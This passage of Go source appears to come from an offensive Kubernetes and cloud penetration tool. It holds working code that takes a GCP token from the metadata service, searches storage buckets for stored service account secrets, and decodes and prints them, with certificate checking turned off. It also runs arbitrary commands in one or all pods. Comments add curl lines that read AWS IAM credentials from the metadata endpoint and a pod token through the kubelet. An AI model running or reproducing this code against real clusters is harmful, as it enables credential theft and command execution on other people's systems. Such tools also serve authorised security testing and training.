			// Create a new HTTP client that uses the correct headers
			// client := &http.Client{}

			// curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
			// curl http://169.254.169.254/latest/meta-data/iam/security-credentials/masters.cluster.bustakube.com
			//
			// Calculate the authorization stuff required:
			// https://docs.aws.amazon.com/AmazonS3/latest/API/sigv4-auth-using-authorization-header.html
			// https://docs.aws.amazon.com/AmazonS3/latest/API/sig-v4-header-based-auth.html
			//
			// List bucket contents:
			// https://docs.aws.amazon.com/AmazonS3/latest/API/v2-RESTBucketGET.html

			// Get the object contents:
			// https://docs.aws.amazon.com/AmazonS3/latest/API/RESTObjectGET.html

			// GET /?list-type=2 HTTP/1.1
			// Host: BucketName.s3.amazonaws.com
			// Date: date
			// Authorization: authorization string (see Authenticating Requests (AWS Signature Version 4))

			break

		// [15] Pull Kubernetes service account tokens from GCS [GCP only]
		case "15":

			token := GetGCPBearerTokenFromMetadataAPI("default")
			if token == "ERROR" {
				println("[-] Could not get GCP default token from metadata API")
				break
			} else {
				println("[+] Got default token for GCP - preparing to use it for GCS:", token)
			}
			// Need to get project ID from metadata API
			client := &http.Client{}
			req_projid, err := http.NewRequest("GET", "http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id", nil)
			req_projid.Header.Add("Metadata-Flavor", "Google")
			resp_projid, err := client.Do(req_projid)
			if err != nil {
				println("Error - could not perform request http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id")
				resp_projid.Body.Close()
				break
			}
			defer resp_projid.Body.Close()
			body, err := ioutil.ReadAll(resp_projid.Body)
			// Parse result as one or more accounts, then construct a request asking for each account's credentials
			project_id := string(body)
			println("[+] Got numberic project ID", project_id)

			// Prepare to do non-cert-checking https requests
			tr := &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			}
			ssl_client := &http.Client{Transport: tr}

			// Get a list of buckets
			// curl -s -H 'Metadata-Flavor: Google' -H "Authorization: Bearer $(cat bearertoken)" -H "Accept: json" https://www.googleapis.com/storage/v1/b/?project=$(cat projectid)
			url_list_buckets := "https://www.googleapis.com/storage/v1/b/?project=" + project_id
			req_list_buckets, err := http.NewRequest("GET", url_list_buckets, nil)
			req_list_buckets.Header.Add("Metadata-Flavor", "Google")
			bearer_token := "Bearer " + token
			req_list_buckets.Header.Add("Authorization", bearer_token)
			req_list_buckets.Header.Add("Accept", "json")
			resp_list_buckets, err := ssl_client.Do(req_list_buckets)
			if err != nil {
				log.Fatal(err)
				fmt.Printf("Error - could not perform request --%s--\n", url_list_buckets)
				resp_list_buckets.Body.Close()
				break
			}
			defer resp_list_buckets.Body.Close()
			body_list_buckets, err := ioutil.ReadAll(resp_list_buckets.Body)
			bucket_list_lines := strings.Split(string(body_list_buckets), "\n")

			// Build our list of bucket URLs
			var bucket_urls []string
			for _, line := range bucket_list_lines {
				if strings.Contains(line, "selfLink") {
					url := strings.Split(line, "\"")[3]
					bucket_urls = append(bucket_urls, url)
				}
			}
			// In every bucket URL, look at the objects
			// Each bucket has a self-link line.  For each one, run that self-link line with /o appended to get an object list.
			for _, line := range bucket_urls {
				println("Checking bucket for credentials:", line)
				url_list_objects := line + "/o"
				req_list_objects, err := http.NewRequest("GET", url_list_objects, nil)
				req_list_objects.Header.Add("Metadata-Flavor", "Google")
				bearer_token := "Bearer " + token
				req_list_objects.Header.Add("Authorization", bearer_token)
				req_list_objects.Header.Add("Accept", "json")
				resp_list_objects, err := ssl_client.Do(req_list_objects)
				if err != nil {
					log.Fatal(err)
					fmt.Printf("Error - could not perform request --%s--\n", url_list_objects)
					resp_list_objects.Body.Close()
					break
				}
				if resp_list_objects.StatusCode != 200 {
					fmt.Printf("[-] Attempt to get bucket contents failed with status code %d\n", resp_list_objects.StatusCode)
					break
				}

				defer resp_list_objects.Body.Close()
				body_list_objects, err := ioutil.ReadAll(resp_list_objects.Body)
				object_list_lines := strings.Split(string(body_list_objects), "\n")

				// Run through the object data, finding selfLink lines with URL-encoded /secrets/ in them.
				for _, line := range object_list_lines {
					if strings.Contains(line, "selfLink") {
						if strings.Contains(line, "%2Fsecrets%2F") {
							object_url := strings.Split(line, "\"")[3]
							// Find the substring that tells us this service account token's name
							start := strings.LastIndex(object_url, "%2F") + 3
							service_account_name := object_url[start:]
							println("\n[+] Getting service account for:", service_account_name)

							// Get the contents of the bucket to get the service account token
							sa_token_url := object_url + "?alt=media"

							req_token, err := http.NewRequest("GET", sa_token_url, nil)
							req_token.Header.Add("Metadata-Flavor", "Google")
							req_token.Header.Add("Authorization", bearer_token)
							req_token.Header.Add("Accept", "json")
							resp_token, err := ssl_client.Do(req_token)
							if err != nil {
								log.Fatal(err)
								fmt.Printf("Error - could not perform request --%s--\n", sa_token_url)
								resp_token.Body.Close()
								break
							}
							if resp_token.StatusCode != 200 {
								fmt.Printf("[-] Attempt to get object contents failed with status code %d\n", resp_token.StatusCode)
								break
							}

							defer resp_token.Body.Close()
							body_token, err := ioutil.ReadAll(resp_token.Body)
							token_lines := strings.Split(string(body_token), "\n")
							for _, line := range token_lines {
								// Now parse this line to get the token
								encoded_token := strings.Split(line, "\"")[3]
								token, err := base64.StdEncoding.DecodeString(encoded_token)
								if err != nil {
									println("Could not decode token.")
								} else {
									println(string(token))
								}

							}

						}
					}
				}
			}

			//
			// Don't forget to base64 decode with base64.StdEncoding.DecodeString()

			break
		case "19":
			break
		// [21] Run command in one or all pods in this namespace
		case "21":
			banner(connectionString)
			println("\n[1] Run command on a specific pod\n[2] Run command on all pods")
			fmt.Scanln(&input)
			println("[+] Please provide the command to run in the pods: ")

			reader := bufio.NewReader(os.Stdin)
			cmdOpts.commandToRunInPods, _ = reader.ReadString('\n')

			// println("Running command ")
			switch input {
			case "1":
				println("[+] Please provide the specified pod to run the command: ")
				fmt.Scanln(&cmdOpts.podsToRunTheCommandIn)
				var pod_to_run_in string
				fmt.Scanln(&pod_to_run_in)
				cmdOpts.podsToRunTheCommandIn = []string{pod_to_run_in}

				if cmdOpts.commandToRunInPods != "" {
					if len(cmdOpts.podsToRunTheCommandIn) > 0 {
						// BUG: execInListPods and execInAllPods both need to be able to split the command on whitespace
						execInListPods(connectionString, cmdOpts.podsToRunTheCommandIn, cmdOpts.commandToRunInPods)
					}
				}
			case "2":
				var input string
				if cmdOpts.commandToRunInPods != "" {
					execInAllPods(connectionString, cmdOpts.commandToRunInPods)
				} else {
					fmt.Print("ERROR - command string was empty.")
					fmt.Scanln(&input)
				}

			}
		// [22] Get a list of pods from the Kubelet [not yet implemented]
		case "22":
			// Use kubectl get nodes to get a list of nodes
			// ---->  GetNodesInfo(connectionString)
			// Use kubectl get node _name_ -o yaml to get IP addresses
			ExecuteCodeOnKubelet(connectionString)
			// Find a line that matches - address: IP
			// curl port 10255 to get pods: curl -sk http://10.23.58.41:10255/pods

			// FAITH working here: Parse the Json to get pod and container names

			// curl port 10250 to run commands:
			// curl -sk https://10.23.58.41:10250/run/namespace/pod/container/ \
			// -d "cmd=cat /run/secrets/kubernetes.io/serviceaccount/token"
		case "98":
			break
		case "99":
			break

		}
		clear_screen()
	}
	//---------------------------------------------------------
	//	parseOptions(&cmdOpts)

	//	if inAPod(connectionString) {
	//		println("+ You are in a pod.")
	//	} else {
	//		println("- You are not in a Kubernetes pod.")
	//	}

	//	allPods := getPodList(connectionString)

	//GetRoles(connectionString, &kubeRoles)
	//GetPodsInfo(connectionString, &podInfo)
	//GetHostMountPoints(podInfo)
	//GetHostMountPointsForPod(podInfo, "attack-daemonset-6fmjc")
	//for _, pod := range allPods {
	// JAY / TODO: Put me back
	//	println("Running a hostname command in pod: " + pod)
	//	print(getHostname(connectionString, pod))
	//}
	//if cmdOpts.commandToRunInPods != "" {
	//	if len(cmdOpts.podsToRunTheCommandIn) > 0 {
	//		execInListPods(connectionString, cmdOpts.podsToRunTheCommandIn, cmdOpts.commandToRunInPods)
	//	} else {
	//		execInAllPods(connectionString, cmdOpts.commandToRunInPods)
	//	}
	//}
	//podCreation := canCreatePods(connectionString)
	//if podCreation {
	//	println("+ This token can create pods on the cluster")
	//} else {
	//	println(" This token cannot create pods on the cluster")
	//}
	//MountRootFS(allPods, connectionString)

}
